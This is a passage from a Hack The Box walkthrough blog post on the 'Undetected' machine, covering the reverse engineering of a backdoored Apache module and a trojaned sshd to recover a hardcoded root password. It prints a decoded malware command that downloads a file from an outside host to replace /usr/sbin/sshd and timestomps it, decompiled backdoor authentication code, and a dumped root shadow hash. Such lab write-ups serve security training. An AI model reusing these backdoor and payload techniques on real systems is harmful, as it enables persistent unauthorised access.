mod_proxy_fcgi.so</span><br><span class="line"> 9827 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_proxy_fdpass.so</span><br><span class="line"> 9869 -rw-r--r-- 1 root root   47312 2022-01-05 14:49:56.000000000 +0000 mod_proxy_ftp.so</span><br><span class="line"> 9878 -rw-r--r-- 1 root root   35024 2022-01-05 14:49:56.000000000 +0000 mod_proxy_hcheck.so</span><br><span class="line"> 9903 -rw-r--r-- 1 root root   39152 2022-01-05 14:49:56.000000000 +0000 mod_proxy_html.so</span><br><span class="line"> 9905 -rw-r--r-- 1 root root   47312 2022-01-05 14:49:56.000000000 +0000 mod_proxy_http.so</span><br><span class="line"> 9977 -rw-r--r-- 1 root root   67936 2022-01-05 14:49:56.000000000 +0000 mod_proxy_http2.so</span><br><span class="line">10062 -rw-r--r-- 1 root root   22768 2022-01-05 14:49:56.000000000 +0000 mod_proxy_scgi.so</span><br><span class="line">10118 -rw-r--r-- 1 root root   22656 2022-01-05 14:49:56.000000000 +0000 mod_proxy_uwsgi.so</span><br><span class="line">10119 -rw-r--r-- 1 root root   18560 2022-01-05 14:49:56.000000000 +0000 mod_proxy_wstunnel.so</span><br><span class="line">10120 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_ratelimit.so</span><br><span class="line">10121 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_reflector.so</span><br><span class="line">10122 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_remoteip.so</span><br><span class="line">10123 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_reqtimeout.so</span><br><span class="line">10124 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_request.so</span><br><span class="line">10125 -rw-r--r-- 1 root root   75984 2022-01-05 14:49:56.000000000 +0000 mod_rewrite.so</span><br><span class="line">10126 -rw-r--r-- 1 root root   43216 2022-01-05 14:49:56.000000000 +0000 mod_sed.so</span><br><span class="line">10127 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_session.so</span><br><span class="line">10134 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_session_cookie.so</span><br><span class="line">10206 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_session_crypto.so</span><br><span class="line">10722 -rw-r--r-- 1 root root   22736 2022-01-05 14:49:56.000000000 +0000 mod_session_dbd.so</span><br><span class="line">10726 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_setenvif.so</span><br><span class="line">10735 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_slotmem_plain.so</span><br><span class="line">10736 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_slotmem_shm.so</span><br><span class="line">10737 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_socache_dbm.so</span><br><span class="line">10738 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_socache_memcache.so</span><br><span class="line">10739 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_socache_redis.so</span><br><span class="line">10740 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_socache_shmcb.so</span><br><span class="line">10741 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_speling.so</span><br><span class="line">10744 -rw-r--r-- 1 root root  248240 2022-01-05 14:49:56.000000000 +0000 mod_ssl.so</span><br><span class="line">10747 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_status.so</span><br><span class="line">10748 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_substitute.so</span><br><span class="line">10749 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_suexec.so</span><br><span class="line">10750 -rw-r--r-- 1 root root   14464 2022-01-05 14:49:56.000000000 +0000 mod_unique_id.so</span><br><span class="line">10751 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_userdir.so</span><br><span class="line">10752 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_usertrack.so</span><br><span class="line">10753 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_vhost_alias.so</span><br><span class="line">10934 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_xml2enc.so</span><br><span class="line">total 8772</span><br></pre></td></tr></table></figure>
+
+<p>This above file is modified quite recently. Let’s download it on Kali and reverse it. Open it with Ghidra.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># scp steven1@undetected.htb:/usr/lib/apache2/modules/mod_reader.so .</span></span><br><span class="line">steven1@undetected.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">mod_reader.so</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2157.jpg"></li>
+</ul>
+<p>One of the functions is ‘b64_decode’. It is being called in an function.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2158.jpg"></li>
+</ul>
+<p>As you can see in decompiler, it gives us the base64 encoded data. Let’s decode it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo -n &quot;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&quot; | base64 -d</span></span><br><span class="line">wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; <span class="built_in">touch</span> -d `<span class="built_in">date</span> +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd</span><br></pre></td></tr></table></figure>
+
+<p>It’s outputting a image data into ‘sshd’ binary. Let’s Download that file and run it via Ghidra.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># scp steven1@undetected.htb:/usr/sbin/sshd .</span></span><br><span class="line">steven1@undetected.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">sshd                                                                                                        100% 3559KB 106.4KB/s   00:33</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2159.jpg"></li>
+</ul>
+<p>As you can see from the above image, there’s a backdoor in ‘Auth-Password’ function. From decompiler, we can safely guess that the password is ’31’ character.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">int auth_password(ssh *ssh,char *password)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  Authctxt *ctxt;</span><br><span class="line">  passwd *ppVar1;</span><br><span class="line">  int iVar2;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  byte *pbVar4;</span><br><span class="line">  byte *pbVar5;</span><br><span class="line">  size_t sVar6;</span><br><span class="line">  byte bVar7;</span><br><span class="line">  int iVar8;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  char backdoor [31];</span><br><span class="line">  byte local_39 [9];</span><br><span class="line">  long local_30;</span><br><span class="line">  </span><br><span class="line">  bVar7 = 0xd6;</span><br><span class="line">  ctxt = (Authctxt *)ssh-&gt;authctxt;</span><br><span class="line">  local_30 = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  backdoor._28_2_ = 0xa9f4;</span><br><span class="line">  ppVar1 = ctxt-&gt;pw;</span><br><span class="line">  iVar8 = ctxt-&gt;valid;</span><br><span class="line">  backdoor._24_4_ = 0xbcf0b5e3;</span><br><span class="line">  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;</span><br><span class="line">  backdoor[30] = -0x5b;</span><br><span class="line">  backdoor._0_4_ = 0xf0e7abd6;</span><br><span class="line">  backdoor._4_4_ = 0xa4b3a3f3;</span><br><span class="line">  backdoor._8_4_ = 0xf7bbfdc8;</span><br><span class="line">  backdoor._12_4_ = 0xfdb3d6e7;</span><br><span class="line">  pbVar4 = (byte *)backdoor;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    pbVar5 = pbVar4 + 1;</span><br><span class="line">    *pbVar4 = bVar7 ^ 0x96;</span><br><span class="line">    <span class="keyword">if</span> (pbVar5 == local_39) <span class="built_in">break</span>;</span><br><span class="line">    bVar7 = *pbVar5;</span><br><span class="line">    pbVar4 = pbVar5;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar2 = strcmp(password,backdoor);</span><br><span class="line">  uVar3 = 1;</span><br><span class="line">  <span class="keyword">if</span> (iVar2 != 0) &#123;</span><br><span class="line">    sVar6 = strlen(password);</span><br><span class="line">    uVar3 = 0;</span><br><span class="line">    <span class="keyword">if</span> (sVar6 &lt; 0x401) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ppVar1-&gt;pw_uid == <span class="number">0</span>) &amp;&amp; (options.permit_root_login != <span class="number">3</span>)) &#123;</span><br><span class="line">        iVar8 = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ((*password != &#x27;\<span class="number">0</span>&#x27;) ||</span><br><span class="line">         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (auth_password::expire_checked == 0) &#123;</span><br><span class="line">          auth_password::expire_checked = 1;</span><br><span class="line">          iVar2 = auth_shadow_pwexpired(ctxt);</span><br><span class="line">          <span class="keyword">if</span> (iVar2 != 0) &#123;</span><br><span class="line">            ctxt-&gt;force_pwchange = 1;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar2 = sys_auth_passwd(ssh,password);</span><br><span class="line">        <span class="keyword">if</span> (ctxt-&gt;force_pwchange != 0) &#123;</span><br><span class="line">          auth_restrict_session(ssh);</span><br><span class="line">        &#125;</span><br><span class="line">        uVar3 = (uint)(iVar2 != 0 &amp;&amp; iVar8 != 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_30 == *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> uVar3;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Looking at the backdoor, I believe we need to stack them up from high to low as below</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">backdoor[30] = -0x5b;</span><br><span class="line">backdoor._28_2_ = 0xa9f4;</span><br><span class="line">backdoor._24_4_ = 0xbcf0b5e3;</span><br><span class="line">backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;</span><br><span class="line">backdoor._12_4_ = 0xfdb3d6e7;</span><br><span class="line">backdoor._8_4_ = 0xf7bbfdc8;</span><br><span class="line">backdoor._4_4_ = 0xa4b3a3f3;</span><br><span class="line">backdoor._0_4_ = 0xf0e7abd6;</span><br></pre></td></tr></table></figure>
+
+<p>Now we have ordered them accordingly. We have to convert this endianness to Hex and from HEX to XOR.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=Swap_endianness(&#x27;Hex&#x27;,31,true)From_Hex(&#x27;Auto&#x27;)XOR(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;96&#x27;%7D,&#x27;Standard&#x27;,false)&amp;input=MHhhNWIKMHhhOWY0CjB4YmNmMGI1ZTMKMHhiMmQ2ZjRhMGZkYTBiM2Q2CjB4ZmRiM2Q2ZTcKMHhmN2JiZmRjOAoweGE0YjNhM2YzCjB4ZjBlN2FiZDY</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2160.jpg"></li>
+</ul>
+<p>As you can see the output is blob. Then I checked the input values.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2161.jpg"></li>
+</ul>
+<p>I have been using one invalid value. The correct value is 0xa5</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=Swap_endianness(&#x27;Hex&#x27;,31,true)From_Hex(&#x27;Auto&#x27;)XOR(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;96&#x27;%7D,&#x27;Standard&#x27;,false)&amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2162.jpg"></li>
+</ul>
+<p>Now we have the backdoor password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@=qfe5%2^k-aq@%k@%6k6b@<span class="variable">$u</span><span class="comment">#f*b?3</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s login via SSH and read root flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># ssh root@undetected.htb</span></span><br><span class="line">root@undetected.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23</span></span><br><span class="line"><span class="string">root@production:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@production:~# whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">root@production:~# cat root.txt </span></span><br><span class="line"><span class="string">39facab6208e1edd81f30d3f913145f9</span></span><br><span class="line"><span class="string">root@production:~# cat /etc/shadow |grep root</span></span><br><span class="line"><span class="string">root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc./cDsb2nNZT0dYIbv.:19031:0:99999:7:::</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2163.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>phpunit CVE-2017-9841 backdoor rce t0 get shell</li>
+<li>linux binary reverse to base64 decode to get shadow hash</li>
+<li>hashcat crack shadow hash</li>
+<li>ghidra reverse .so backdoor</li>
+<li>use cyberchef “swap endianness”, “from hex”, “xor” to get root password</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/02/24/undetected/" title="Hack-The-Box-walkthrough[undetected]">https://fdlucifer.github.io/2022/02/24/undetected/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/16/acute/" rel="prev" title="Hack-The-Box-walkthrough[acute]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[acute]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/02/routerspace/" rel="next" title="Hack-The-Box-walkthrough[routerspace]">
+                  Hack-The-Box-walkthrough[routerspace] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
